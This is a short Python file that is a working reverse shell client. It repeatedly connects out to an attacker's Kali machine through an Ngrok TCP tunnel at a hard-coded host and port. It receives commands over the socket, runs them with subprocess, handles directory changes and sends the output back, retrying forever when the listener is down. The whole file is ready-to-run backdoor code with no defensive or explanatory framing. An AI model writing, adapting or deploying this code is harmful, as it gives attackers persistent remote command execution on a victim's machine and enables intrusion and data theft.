import socket
import subprocess
import os

# IP and port of your server (Kali machine via Ngrok)
HOST = '0.tcp.in.ngrok.io'  # Use the Ngrok public IP
PORT = 17773  # Use the port Ngrok provided

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        while True:
            # Receive the command from the server
            command = s.recv(1024).decode()

            if command.lower() == "exit":
                s.close()  # Close the connection if 'exit' command is received
                break

            # Handle 'cd' command to change directories
            if command.startswith("cd "):
                try:
                    os.chdir(command.strip()[3:])  # Change the directory
                    s.send(b"[+] Changed directory\n")
                except Exception as e:
                    s.send(str(e).encode())  # Send error if something goes wrong
                continue

            # Execute other commands using subprocess
            output = subprocess.getoutput(command)
            s.send(output.encode())  # Send the output back to the server

    except Exception as e:
        continue  # Keep retrying if the server is not available

